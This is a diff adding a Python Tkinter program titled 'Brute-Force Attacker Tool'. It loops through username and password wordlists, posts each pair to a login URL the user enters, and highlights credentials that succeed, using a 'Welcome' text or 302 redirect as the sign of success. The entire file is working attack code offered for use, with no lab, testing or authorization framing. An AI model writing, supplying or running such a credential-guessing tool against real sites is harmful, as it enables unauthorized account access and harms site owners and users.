@@ -1,0 +1,163 @@
+import tkinter as tk
+from tkinter import messagebox, filedialog, ttk
+import threading
+import time
+import requests
+
+# Global flag to control the brute-force attack
+is_running = False
+
+# Function to test login via HTTP POST request
+def test_login(username, password, url):
+    """
+    Send an HTTP POST request to the login URL with the given credentials.
+    Returns True if login is successful, False otherwise.
+    """
+    data = {"username": username, "password": password}
+    try:
+        response = requests.post(url, data=data)
+        # Check for indicators of success (e.g., "Welcome" in response or redirect status code)
+        if "Welcome" in response.text or response.status_code == 302:
+            return True
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+    return False
+
+# Core brute-force logic
+def brute_force_attack(username_file, password_file, url, delay, result_text, valid_credentials_label):
+    """
+    Perform brute-force attack by iterating through usernames and passwords.
+    """
+    global is_running
+    is_running = True  # Start the attack
+
+    try:
+        with open(username_file, 'r', encoding='utf-8', errors='ignore') as user_f, \
+             open(password_file, 'r', encoding='utf-8', errors='ignore') as pass_f:
+            
+            usernames = [line.strip() for line in user_f if line.strip()]
+            passwords = [line.strip() for line in pass_f if line.strip()]
+
+            for username in usernames:
+                if not is_running:  # Check if the attack should stop
+                    break
+
+                for password in passwords:
+                    if not is_running:  # Check if the attack should stop
+                        break
+
+                    result_text.insert(tk.END, f"Trying: Username={username}, Password={password}\n")
+                    result_text.see(tk.END)  # Auto-scroll to the latest entry
+                    
+                    if test_login(username, password, url):
+                        valid_credentials = f"Success! Found credentials: Username={username}, Password={password}"
+                        result_text.insert(tk.END, valid_credentials + "\n", "success")
+                        result_text.tag_config("success", foreground="green")
+                        result_text.see(tk.END)
+
+                        # Display valid credentials in a separate label
+                        valid_credentials_label.config(text=valid_credentials, foreground="green")
+
+                    # Rate-limiting: Add a delay between requests
+                    time.sleep(delay)
+        
+        if is_running:  # Only show completion message if the attack wasn't stopped
+            result_text.insert(tk.END, "Brute-force attack completed. All combinations tested.\n", "info")
+            result_text.tag_config("info", foreground="blue")
+            result_text.see(tk.END)
+    
+    except Exception as e:
+        messagebox.showerror("Error", f"An error occurred: {e}")
+
+# Function to stop the attack
+def stop_attack():
+    global is_running
+    is_running = False  # Set the flag to stop the attack
+    messagebox.showinfo("Info", "Attack stopped by user.")
+
+# GUI setup
+def start_brute_force():
+    global is_running
+    if is_running:  # Prevent starting multiple attacks simultaneously
+        messagebox.showwarning("Warning", "An attack is already running.")
+        return
+
+    username_file = username_entry.get()
+    password_file = password_entry.get()
+    url = url_entry.get()
+    
+    # Get the rate-limiting delay from the input field
+    try:
+        delay = float(delay_entry.get())
+        if delay < 0:
+            raise ValueError("Delay cannot be negative.")
+    except ValueError:
+        messagebox.showerror("Error", "Please enter a valid positive number for the rate-limiting delay.")
+        return
+
+    if not username_file or not password_file or not url:
+        messagebox.showerror("Error", "Please provide all required inputs.")
+        return
+
+    def task():
+        brute_force_attack(username_file, password_file, url, delay, result_text, valid_credentials_label)
+
+    # Run the brute-force task in a separate thread to avoid freezing the GUI
+    threading.Thread(target=task).start()
+
+# Create the main window
+root = tk.Tk()
+root.title("Brute-Force Attacker Tool")
+root.geometry("800x600")  # Set window size
+root.configure(bg="#2c3e50")  # Dark blue background
+
+# Style configuration
+style = ttk.Style()
+style.theme_use("clam")  # Modern theme
+style.configure("TLabel", background="#2c3e50", foreground="white", font=("Arial", 12))
+style.configure("TButton", background="#3498db", foreground="white", font=("Arial", 12, "bold"))
+style.configure("TEntry", fieldbackground="#ecf0f1", foreground="#2c3e50", font=("Arial", 12))
+style.map("TButton", background=[("active", "#2980b9")])  # Hover effect
+
+# Input fields
+tk.Label(root, text="Brute-Force Attacker Tool", bg="#2c3e50", fg="#ecf0f1", font=("Arial", 18, "bold")).pack(pady=10)
+
+ttk.Label(root, text="Login URL").pack(pady=5)
+url_entry = ttk.Entry(root, width=50)
+url_entry.pack(pady=5)
+
+ttk.Label(root, text="Username Wordlist File").pack(pady=5)
+username_entry = ttk.Entry(root, width=50)
+username_entry.pack(pady=5)
+ttk.Button(root, text="Select Username File", command=lambda: username_entry.insert(0, filedialog.askopenfilename())).pack(pady=5)
+
+ttk.Label(root, text="Password Wordlist File").pack(pady=5)
+password_entry = ttk.Entry(root, width=50)
+password_entry.pack(pady=5)
+ttk.Button(root, text="Select Password File", command=lambda: password_entry.insert(0, filedialog.askopenfilename())).pack(pady=5)
+
+ttk.Label(root, text="Rate-Limiting Delay (seconds)").pack(pady=5)
+delay_entry = ttk.Entry(root, width=10)
+delay_entry.insert(0, "1")  # Default delay of 1 second
+delay_entry.pack(pady=5)
+
+# Start and Stop buttons
+button_frame = tk.Frame(root, bg="#2c3e50")
+button_frame.pack(pady=10)
+
+ttk.Button(button_frame, text="Start Brute-Force Attack", command=start_brute_force).pack(side=tk.LEFT, padx=10)
+ttk.Button(button_frame, text="Stop Attack", command=stop_attack).pack(side=tk.RIGHT, padx=10)
+
+# Result display
+result_text = tk.Text(root, height=15, width=90, bg="#ecf0f1", fg="#2c3e50", font=("Arial", 10))
+result_text.pack(pady=10)
+
+# Valid credentials display
+valid_credentials_label = tk.Label(root, text="No valid credentials found yet.", bg="#2c3e50", fg="white", font=("Arial", 12, "bold"))
+valid_credentials_label.pack(pady=10)
+
+# Separator
+ttk.Separator(root, orient="horizontal").pack(fill="x", pady=10)
+
+# Run the GUI
+root.mainloop()
